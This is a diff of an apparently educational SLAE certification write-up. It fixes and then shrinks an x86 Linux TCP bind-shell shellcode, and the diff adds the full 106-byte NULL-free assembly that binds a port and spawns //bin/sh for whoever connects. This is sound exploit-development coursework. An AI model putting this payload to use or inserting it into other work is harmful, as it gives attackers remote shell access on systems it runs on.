@@ -116,9 +116,10 @@ xor ebx, ebx    ; Clear EBX
 mov bl, 0x2     ; SYS_BIND
 ; Setup struct addr
 push EDX        ; 0.0.0.0 (EDX is still all 0s)
+sub esp, 2      ; Move ESP so we don't overwrite ip-addr
 mov byte [esp], 0x1c    ; Push first byte for port
 mov byte [esp+1], dl    ; Push second byte for port
-push 0x2        ; AF_INET
+push word 0x2   ; AF_INET
 mov ecx, esp    ; Store ref to struct in ECX
 ; Setup bind arguments
 push 0x10       ; Addr length (16)
@@ -239,9 +240,10 @@ main:
     mov bl, 0x2     ; SYS_BIND
     ; Setup struct addr
     push edx        ; 0.0.0.0
+    sub esp, 2      ; Move ESP so we don't overwrite ip-addr
     mov byte [esp], 0x1c    ; Push first byte for port
     mov byte [esp+1], dl    ; Push second byte for port
-    push 0x2        ; AF_INET
+    push word 0x2   ; AF_INET
     mov ecx, esp    ; Store struct in ECX
     ; Setup bind arguments
     push 0x10       ; Addr length (16)
@@ -301,6 +303,151 @@ main:
     int 0x80
 ```
 
+When we compile and run this code, we can see that it works:
+Terminal 1:
+![Terminal 1](https://raw.githubusercontent.com/mrpapercut/SLAE/master/assignment1/images/shellcode-terminal1.png)
+
+Terminal 2:
+![Terminal 2](https://raw.githubusercontent.com/mrpapercut/SLAE/master/assignment1/images/shellcode-terminal2.png)
+
+### Shrinking shellcode
+134 bytes of shellcode is nice, but it can be made smaller. There are a couple of optimizations we can perform to shave some bytes off this code.
+
+First of all, we perform the same setup for SYS_SOCKETCALL several times. Every time we do the following:
+```asm
+xor eax, eax
+mov al, 0x66
+```
+If instead we assign the value we want to EDI, we can reuse EDI every time we want this syscall:
+```asm
+xor edi, edi    ; Clear EDI
+xor edi, 0x66   ; EDI is now 0x00000066
+mov eax, edi    ; EAX is now the same as if we did xor eax, eax -> mov al, 0x66
+
+;; Further in the code
+mov eax, edi    ; We can do this every time
+```
+The second argument for SYS_SOCKETCALL is (in order of code) 0x1, 0x2, 0x4 and 0x5 for the functions socket, bind, listen and accept, respectively. During these calls, EBX is never changed, so we can simply increment the value in EBX for each function (and increment twice between bind() and listen()).
+
+The dup2() functions can be easily optimized as well. As we've seen before, we only need to re-setup EAX and increment ECX for the second and third time we call dup2(). This can be put in a loop:
+```asm
+    mov ebx, eax        ; Ref to socketid
+    xor eax, eax        ; Zero-out EAX
+    xor ecx, ecx        ; Zero-out ECX
+    mov cl, 0x2         ; Set counter
+duploop:
+    mov al, 0x3f        ; SYS_DUP2
+    int 0x80            ; Exec syscall
+    dec ecx             ; Decrement ECX
+    jns duploop         ; Loop
+```
+This will run the functions in reverse order (by decrementing the second argument 2, 1, 0).
+
+Lastly, we don't need to call "////bin/bash" right? We can also use "//bin/sh", which saves a full instruction:
+```asm
+; Before:
+push 0x68736162 ; "hsab"
+push 0x2f6e6962 ; "/nib"
+push 0x2f2f2f2f ; "////"
+
+; After:
+push 0x68732f6e     ; "hs/n"
+push 0x69622f2f     ; "ib//"
+```
+
+With a few more optimizations, we end up with the following shellcode:
+```asm
+section .text
+global main
+
+main:
+    xor edx, edx        ; Zero-out EDX for later use
+    xor edi, edi        ; Zero-out EDI
+    xor edi, 0x66       ; Set 0x66 in EDI for later
+
+    ; sockfd = socket(PF_INET, SOCK_STREAM, 0)
+    mov eax, edi        ; SYS_SOCKETCALL
+    mov ebx, edx        ; Zero-out EBX
+    mov bl, 0x1         ; SYS_SOCKET
+    push edx            ; 0
+    push byte 0x1       ; SOCK_STREAM
+    push byte 0x2       ; PF_INET
+    mov ecx, esp        ; Address of socket arguments
+    int 0x80            ; Exec syscall
+
+    ; We need the result later
+    mov esi, eax        ; Store ref to sockfd in ESI
+
+    ; bind(sockid, struct addr, addrlen)
+    mov eax, edi        ; SYS_SOCKETCALL
+    inc ebx             ; SYS_BIND
+    ; Setup struct addr
+    push edx            ; 0.0.0.0 (this is why we needed EDX at line 5)
+    sub esp, 2          ; Move ESP so we don't overwrite ip-addr
+    mov byte [esp], 0x1c    ; Push first byte of port
+    mov byte [esp+1], dl    ; Push second byte of port
+    push word 0x2       ; AF_INET
+    mov ecx, esp        ; Store struct in ECX
+    ; Setup bind arguments
+    push 0x10           ; Length addr (16)
+    push ecx            ; Struct addr
+    push esi            ; Ref to sockfd
+    mov ecx, esp        ; Address of bind arguments
+    int 0x80            ; Exec syscall
+
+    ; listen(sockid, 2)
+    mov eax, edi        ; SYS_SOCKETCALL
+    push ebx            ; Argument "2"
+    inc ebx             ; SYS_LISTEN
+    inc ebx             ; (2 bytes instead of 3 for "add ebx, 0x2")
+    ; Setup arguments
+    push esi            ; Ref to sockid
+    mov ecx, esp        ; Address of listen arguments
+    int 0x80            ; Exec syscall
+
+    ; socketid = accept(sockfd, null, null)
+    mov eax, edi        ; SYS_SOCKETCALL
+    inc ebx             ; SYS_ACCEPT
+    push edx            ; NULL (this is also why we needed EDX at line 5)
+    push esi            ; Ref to sockid
+    mov ecx, esp        ; Address of accept arguments
+    int 0x80            ; Exec syscall
+
+    ; dup2(socketid, 0)
+    mov ebx, eax        ; Ref to socketid
+    xor eax, eax        ; Zero-out EAX
+    xor ecx, ecx        ; Zero-out ECX
+    mov cl, 0x2         ; Set counter
+duploop:
+    mov al, 0x3f        ; SYS_DUP2
+    int 0x80            ; Exec syscall
+    dec ecx             ; Decrement ECX
+    jns duploop         ; Loop
+
+    ; execve("//bin/sh", NULL, NULL)
+    xor eax, eax        ; Zero-out EAX
+    mov al, 0x0b        ; SYS_EXECVE
+    push edx            ; Push NULL character to stack
+    push 0x68732f6e     ; "hs/n"
+    push 0x69622f2f     ; "ib//"
+    mov ebx, esp        ; Ref to "//bin/sh" from stack
+    inc ecx             ; ECX to 0
+    int 0x80            ; Exec syscall
+```
+
+This shortens the length of the shellcode from __134__ bytes to __106__ bytes, a full 28 bytes less, or 20% of the original shellcode!
+
+## Making the port configurable
+We already prepared the code to accept configurable port numbers. In order to avoid NULL-bytes, we substitute those with __dl__. When we put this in a wrapper-script, the script will convert the provided port into hexadecimals, and uses __dl__ where 0x00 is provided. The full code of the wrapper script can be found in the file [template.sh](https://raw.githubusercontent.com/mrpapercut/SLAE/master/assignment1/template.sh).
+
+## Conclusion
+This assignment is solved by first writing the C code, then going through each function to see how it can be translated to x86 assembly. 
+After optimizations and creating a template-script for generating assembly code, we end up with a 106 byte TCP Bind shellcode that provides a shell when you connect on the provided port.
 
 
 
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+https://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+Student ID: SLAE-1147
